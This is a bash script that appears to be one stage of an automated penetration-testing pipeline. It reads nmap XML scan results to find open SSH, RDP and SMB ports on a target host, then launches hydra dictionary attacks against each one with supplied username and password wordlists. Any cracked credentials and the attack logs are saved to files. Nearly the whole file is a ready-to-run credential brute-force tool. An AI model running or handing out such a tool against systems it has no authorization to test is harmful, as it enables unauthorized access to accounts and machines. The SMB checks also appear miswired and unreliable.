#!/bin/bash
echo "$3"
FILE_PATH="$3"
HOST="$2"
#USER WORDLISTS
USER_SSH="$4"
USER_RDP="$5"
USER_SMB="$6"
USER_LIST="$7"

#PASSWORD WORDLISTS
PASS_HYDRA="$8"
PASS_SSH="$9"
PASS_RDP="${10}"
PASS_SMB="${11}"
SHORT_P="${12}"
LONG_P="${13}"

echo "USER IS THISSSSS $USER_SSH";
##                   ##
###   XML PARSER    ###
##                   ##

#  
#  name: tcp_service_on 
#  @param: state of port={open, filtered} ; port name={http, ssh, ...} ; ssl={1 == YES, 0 == NO}
#  @return: 0 = {port found} ; 10 {port not found}
#  
tcp_service_on () {
    if [[ "$3" == '0' ]]; then 
        xmllint --xpath "//port[state[@state='$1'] and service[@name='$2']]" "$FILE_PATH/IG/NMAP/script-syn.xml" &> /dev/null
    elif [[ "$3" == '1' ]]; then 
        xmllint --xpath "//port[state[@state='$1'] and service[@name='$2' and @tunnel='ssl']]" "$FILE_PATH/IG/NMAP/script-syn.xml" &> /dev/null
    else 
        return 1    #ERROR
    fi
}

tcp_service_on2 () {
    if [[ "$3" == '0' ]]; then 
        xmllint --xpath "//port[state[@state='$1'] and service[@name='$2']]" "$FILE_PATH/IG/NMAP/cve.xml" &> /dev/null
    elif [[ "$3" == '1' ]]; then 
        xmllint --xpath "//port[state[@state='$1'] and service[@name='$2' and @tunnel='ssl']]" "$FILE_PATH/IG/NMAP/cve.xml" &> /dev/null
    else 
        return 1    #ERROR
    fi
}

#  
#  name: udp_service_on 
#  @param: port name={rpcbind, mdns, ...}
#  @return: 0 = {port found} ; 10 {port not found}
# 
udp_service_on () {
    xmllint --xpath "//port[state[@state='open|filtered'] and service[@name='$1']]" "$FILE_PATH/IG/NMAP/udp.xml" &> /dev/null
}

#  
#  name: print_portid
#  @param: state of port={open, filtered} ; port name={http, ssh, ...} ; ssl={1 == YES, 0 == NO}
#  @return: portid
#
print_portid () {
    if [[ "$3" == '0' ]]; then
        xmllint --xpath "//port[state[@state='$1'] and service[@name='$2']]/@portid" "$FILE_PATH/IG/NMAP/script-syn.xml" | cut -c 2- | tr " " "\n" | cut -f2 -d'"'
    elif [[ "$3" == '1' ]]; then
        xmllint --xpath "//port[state[@state='$1'] and service[@name='$2' and @tunnel='ssl']]/@portid" "$FILE_PATH/IG/NMAP/script-syn.xml" | cut -c 2- | tr " " "\n" | cut -f2 -d'"'
    else 
        return 1    #ERROR
    fi
}
print_portid2 () {
    if [[ "$3" == '0' ]]; then
        xmllint --xpath "//port[state[@state='$1'] and service[@name='$2']]/@portid" "$FILE_PATH/IG/NMAP/cve.xml" | cut -c 2- | tr " " "\n" | cut -f2 -d'"'
    elif [[ "$3" == '1' ]]; then
        xmllint --xpath "//port[state[@state='$1'] and service[@name='$2' and @tunnel='ssl']]/@portid" "$FILE_PATH/IG/NMAP/cve.xml" | cut -c 2- | tr " " "\n" | cut -f2 -d'"'
    else 
        return 1    #ERROR
    fi
}


# ssh
        tcp_service_on 'open' 'ssh' '0' && {
            # print_succ 'starting dictionary attack against SSH service...';
            for PORT in $(print_portid 'open' 'ssh' '0'); do
            hydra -s $PORT -v -V -o "$FILE_PATH/DA/PASSWORD/cred_ssh" -L $USER_SSH -P $PASS_SSH -F -t 4 $HOST ssh &> "$FILE_PATH/DA/EVIDENCE/ssh_attack"
            # print_std "$(grep 'host:' "$FILE_PATH/DA/PASSWORD/cred_ssh" || echo 'PASSWORD NOT FOUND')"
            done;
        }
                tcp_service_on2 'open' 'ssh' '0' && {
            # print_succ 'starting dictionary attack against SSH service...';
            for PORT in $(print_portid2 'open' 'ssh' '0'); do
            hydra -s $PORT -v -V -o "$FILE_PATH/DA/PASSWORD/cred_ssh2" -L $USER_SSH -P $PASS_SSH -F -t 4 $HOST ssh &> "$FILE_PATH/DA/EVIDENCE/ssh_attack2"
            # print_std "$(grep 'host:' "$FILE_PATH/DA/PASSWORD/cred_ssh" || echo 'PASSWORD NOT FOUND')"
            done;
        }
        
        #rdp (Remote Desktop)
        tcp_service_on 'open' 'ms-wbt-server' '0' && {
            # print_succ 'starting dictionary attack against RDP service (no domain)...';
            echo 'In Remote Desktop Test'
            for PORT in $(print_portid 'open' 'ms-wbt-server' '0'); do
            hydra -s $PORT -v -V -o "$FILE_PATH/DA/PASSWORD/cred_rdp" -L $USER_RDP -P $PASS_RDP -F -t 4 $HOST rdp &> "$FILE_PATH/DA/EVIDENCE/rdp_attack"
            # print_std "$(grep 'host:' "$FILE_PATH/DA/PASSWORD/cred_rdp" || echo 'PASSWORD NOT FOUND')"
            done;
        }
        
        tcp_service_on 'open' 'ms-wbt-server' '1' && {
            # print_succ 'starting dictionary attack against SSL/RDP service...';
            echo 'In Remote Desktop SSL'
            for PORT in $(print_portid 'open' 'ms-wbt-server' '1'); do
            hydra -S -s $PORT -v -V -o "$FILE_PATH/DA/PASSWORD/cred_ssl_rdp" -L $USER_RDP -P $PASS_RDP -F -t 4 $HOST rdp &> "$FILE_PATH/DA/EVIDENCE/ssl_rdp_attack"
            # print_std "$(grep 'host:' "$FILE_PATH/DA/PASSWORD/cred_ssl_rdp" || echo 'PASSWORD NOT FOUND')"
            done;
        }

        #smb (Server Message Block)
        tcp_service_on "open" "445" > /dev/null && {
            echo '--------------------------';
            echo 'START BRUTE FORCE SMB...';
            echo '--------------------------';
            hydra -s 445 -F -o "$FILE_PATH/EX/HYDRA/cred_smb" -L $USER_SMB -P $PASS_HYDRA -t 16 -m BothHash $HOST smb > /dev/null;
            echo '--------------------------';
            echo 'END BRUTE FORCE SMB';
            echo '--------------------------';
        }

                tcp_service_on2 "open" "445" > /dev/null && {
            echo '--------------------------';
            echo 'START BRUTE FORCE SMB...';
            echo '--------------------------';
            hydra -s 445 -F -o "$FILE_PATH/EX/HYDRA/cred_smb2" -L $USER_SMB -P $PASS_HYDRA -t 16 -m BothHash $HOST smb > /dev/null;
            echo '--------------------------';
            echo 'END BRUTE FORCE SMB';
            echo '--------------------------';
        }

        echo 'Done DA!'
        exit 0